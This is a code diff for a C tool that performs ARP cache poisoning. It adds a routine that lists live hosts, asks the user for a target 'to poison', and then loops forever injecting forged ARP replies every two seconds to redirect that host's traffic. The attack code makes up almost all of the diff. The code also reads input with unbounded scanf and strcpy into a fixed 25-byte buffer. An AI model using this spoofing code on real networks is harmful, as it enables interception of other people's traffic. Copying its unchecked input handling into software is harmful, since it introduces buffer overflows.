@@ -61,77 +61,92 @@ short arp_receiver_start( struct net *_net )
     return 0;
 }
 
-void rescan_input( char *target, struct endpoint *_entps )
-{
-    while ( !match_target( target, _entps ) ) {
-        printf( "%s[!]%s Target not in list!\n\n", RED, NLL );
-        printf( "%s[-]%s Choose a target to poison: ", GRN, NLL );
-        scanf( "%s", target );
-    }
-}
-
 void list_targets( struct endpoint *_entps )
 {
-    printf( "\n%s[+]%s Listing targets...\n", GRN, NLL );
     for ( register uint32_t i = 0 ; i < live_hosts ; i++ ){
         printf( "%s[-]%s %s\n", GRN, NLL, (_entps++)->host_ip );
     }
+    printf( "\n" );
 }
 
-int8_t match_target( char *target, struct endpoint *_entps )
+short endpoint_hw( char *ip, uint8_t *hw, struct endpoint *_entps )
 {
-    int8_t match = 0;
-
-    if ( live_hosts <= 0 ){
-        return match;
+    if ( live_hosts <= 0 ) {
+        return -1;
     }
     for ( register uint32_t i = 0 ; i < live_hosts ; i++ ) {
-        if ( strcmp( target, _entps->host_ip ) == 0 ) {
-            match = 1;
+        if ( strcmp( ip, _entps->host_ip ) == 0 ) {
+            cnvrt_hw2b( _entps->host_hw, hw );
+            return 0;
         }
         _entps++;
     }
-    return match;
+    return -1;
+}
+
+void __spoof( char *target, uint8_t *t_hw, char *host, struct net *_net )
+{
+    uint8_t src_hw[6];
+    uint8_t src_ip[4];
+    uint8_t dst_ip[4];
+
+    cnvrt_hw2b( _net->hw, src_hw );
+    cnvrt_ip2b( host,     src_ip );
+    cnvrt_ip2b( target,   dst_ip );
+
+    for ( ;; ) {
+        arp_inject(
+            lt, ARPOP_REPLY, src_hw, src_ip, t_hw, dst_ip
+        );
+        sleep( 2 );
+    }
 }
 
 void arpspoof( struct net *_net, struct spoof_endpoints *_spf )
 {
+    short t;
     char target[25];
     struct endpoint _endps[_net->hosts_range];
 
     if ( arp_receiver_start( _net ) < 0 )
         __die( arpspoof_errbuf );
-
-    // THIS CODE HERE IS VERY UGLY :puke: (but at least it works)
-    if ( !_spf->target ){
-        printf( "\n" );
-        printf( "%s[!]%s Target not specified!\n", RED, NLL );
-        printf( "%s[+]%s Refreshig arp table...\n",  GRN, NLL );
-        arp_refresh( _net );
-    }
-    else {
-        strcpy( target, _spf->target );
-        printf( "\n%s[+]%s Probing target...\n", GRN, NLL );
-        probe_endpoint( _spf->target, _net );
-
-        printf( "\n%s[+]%s Probing host...\n", GRN, NLL );
-        probe_endpoint( _spf->host, _net );
+    
+    t = ( !_spf->target ) ? 0 : 1 ;
+    switch ( t ) {
+        case 0:
+            printf( "%s[!]%s Target not specified!\n", RED, NLL );
+            printf( "%s[+]%s Refreshing arp table...\n", GRN, NLL );
+            arp_refresh( _net );
+            break;
+        
+        default:
+            printf( "%s[+]%s Probing target...\n", GRN, NLL );
+            probe_endpoint( _spf->target, _net );
+            strcpy( target, _spf->target );
+            break;
     }
 
     if ( lookup_arp( _net->iface, _endps ) < 0 ) {
         __die( arpspoof_errbuf );
     }
 
-    if ( !_spf->target ) {
+    if ( !t ) {
+        printf( "%s[+]%s Listing targets...\n", GRN, NLL );
         list_targets( _endps );
-        printf( "%s[-]%s Choose a target to poison: ", GRN, NLL );
+        printf( "%s[+]%s Select target to poison: ", GRN, NLL );
         scanf( "%s", target );
 
-        if ( !match_target( target, _endps ) ) {
-            rescan_input( target, _endps );
+        if ( endpoint_hw( target, _spf->target_hw, _endps ) < 0 ) {
+            __die( "Target is not a live host!\n" );
         }
+    } else {
+        endpoint_hw( target, _spf->target_hw, _endps );
     }
 
-    endpoint_hw( target, _spf->target_hw, _endps );
-    endpoint_hw( _spf->host, _spf->host_hw, _endps );
+    // start spoofing
+    __spoof( 
+         target, _spf->target_hw,
+        _spf->host,
+        _net
+    );
 }
